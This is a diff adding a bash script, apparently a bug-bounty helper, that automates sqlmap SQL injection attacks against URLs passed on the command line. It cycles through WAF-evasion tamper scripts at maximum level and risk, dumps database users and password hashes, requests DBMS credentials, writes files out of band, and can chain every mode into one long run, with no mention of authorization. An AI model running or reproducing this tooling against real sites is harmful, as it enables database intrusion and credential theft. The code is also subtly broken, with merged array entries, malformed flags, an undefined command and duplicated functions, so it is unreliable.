@@ -1,0 +1,284 @@
+#!/bin/bash
+
+
+      echo "SQlMAP AUTOMATION"
+      echo "NOBODY HIDE FORM ME!"
+
+echo "@Deepak"
+echo "@binwalk "
+
+tamp=('apostrophemask' 'apostrophenullencode' 'base64encode' 'between' 'bluecoat' 'chardoubleencode' 'charencode' 'charunicodeencode''concat2concatws ''equaltolike''greatest''halfversionedmorekeywords''ifnull2ifisnull''modsecurityversioned''modsecurityzeroversioned''multiplespaces''nonrecursivereplacement''percentage''randomcase''randomcomments''securesphere''space2comment''space2dash''space2hash''space2morehash''space2mssqlblank''space2mysqldash''space2plus''space2randomblank''unionalltounion''unmagicquotes')
+
+
+
+
+##
+## Injection based attack in sqlmap 
+##
+injection () {
+             
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+        sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i"
+    
+    done
+
+    
+}
+
+##
+## File Based attack 
+##
+
+file_based_attack() {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+       sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbs tamper="$i"
+    
+    done
+    
+}
+
+
+##
+## Brute-based attacks
+##
+
+brute_based_attacks () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+        sqlmap -m "$urls"  --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --users --passwords --tamper="$i"
+    
+    done
+
+}
+
+##
+## Time-based attacks
+##
+
+time_based_attacks () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --time-sec=5 --dbs --tamper="$i"
+    
+    done 
+
+}
+
+##
+## Error-based attacks
+##
+
+error_based_attacks () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+   sqlmap -m "$urls" --dbms="$dbms"--level=5 --risk=3 --threads=5 --batch --errors --tamper="$i"
+
+    
+    done 
+   
+}
+
+##
+## Blind-based attacks
+##
+
+blind_based_attacks () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --dbms-cred --tamper="$i"
+
+    
+    done 
+}
+
+##
+## Out-of-band attacks 
+##
+
+out_of_band_attacks () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+    sqlmap -m "$urls" --dbms="$dbms" --level=5 --risk=3 --threads=5 --batch --oob --file-write="/tmp/data.txt" --tamper="$i"
+
+    
+    done      
+
+
+}
+
+
+##
+## Database Detection 
+##
+
+database_detect () {
+
+    for i in "${tamp[@]}"; do #${arrayName[@]}
+    ##################################
+    echo "$i"
+    ##################################
+    sqlmap -m "$urls"  --level=5 --risk=3 --threads=5 --batch --banner --tamper="$i"
+
+    
+    done 
+}
+
+
+## starting ##
+##          ## 
+
+process () {
+ select attack in  injection_based  file_based blind_based brute_based time_based error_based out_of_band bayekar data_base_detect 
+ do 
+    case $attack in 
+
+        injection_based)
+                      echo "Injection Attacks..."
+                     injection #function 
+                      break
+                       ;;
+        
+        file_based)
+                   echo "File Based Attacks"
+                   file_based_attack
+                   break
+                    ;;         
+       blind_based)
+                   echo "Blind Based Attack"
+                   blind_based_attacks
+                   break
+                   ;;
+        brute_based)
+                   echo "Brute Based Attacks"
+                   brute_based_attacks
+                   break
+                   ;;
+        time_based)
+                   echo "Time Based Attacks"
+                   time_based_attacks
+                   break
+                   ;;
+        error_based)
+                   echo "Error Based Attacks"
+                   error_based_attacks
+                   break
+                   ;;
+        out_of_band)
+                   echo "Out OF Band Attacks"
+                   out_of_band_attacks
+                   break
+                   ;;
+            bayekar)
+                echo "All attack on single traget"
+                ################################
+                sleep 3
+                clear
+                echo "WARNING !"
+                echo "Take Time upto 14 hrs"
+                injection
+                wait
+                file_based_attack
+                wait
+                blind_based_attacks
+                wait
+                brute_based_attacks
+                wait
+                time_based_attacks
+                wait
+                error_based_attacks
+                wait
+                out_of_band_attacks
+                break
+                 ;;
+  data_base_detect)
+                  echo "Database Detection Start..."
+                  database_detect
+                  continue
+                  ;;
+                 *)
+                 echo "Try again.."
+                   break
+                  ;;
+            esac
+ done
+}
+
+# instaltion
+setup () {
+    
+     TOOL="sqlmap"
+     
+    if ! command -v $TOOL &> /dev/null; then
+    echo "$TOOL is not installed."
+    sudo apt update -y
+    clear
+    sudo apt upgrade -y
+    clear
+    sudo apt autoremove -y
+    clear
+    sudo apt autoclean -y
+    clear
+    sudo apt dist-update -y
+    clear
+    sudo apt install sqlmap
+    clear
+    process
+    else
+    echo "$TOOL is already installed."
+    process
+    fi
+    
+}
+
+
+#creating a folder with domain 
+folder () {
+
+  pwd
+
+  #create folder name bugbounty
+  mkdir bugbounty ; cd bugbounty ||
+  pwd
+
+  #create domain folder
+  mkdir sqlmap ; cd sqlmap ||
+  pwd
+
+}
+# fir () {
+# # read -p "Enter the filename's" urls
+# # echo $urls
+# # read -p "Enter the dbms name " dbms
+
+# }
+# #folder function is closed
+# fir
+urls=$1
+dbms=$2
+enter
+folder
+setup
+
+
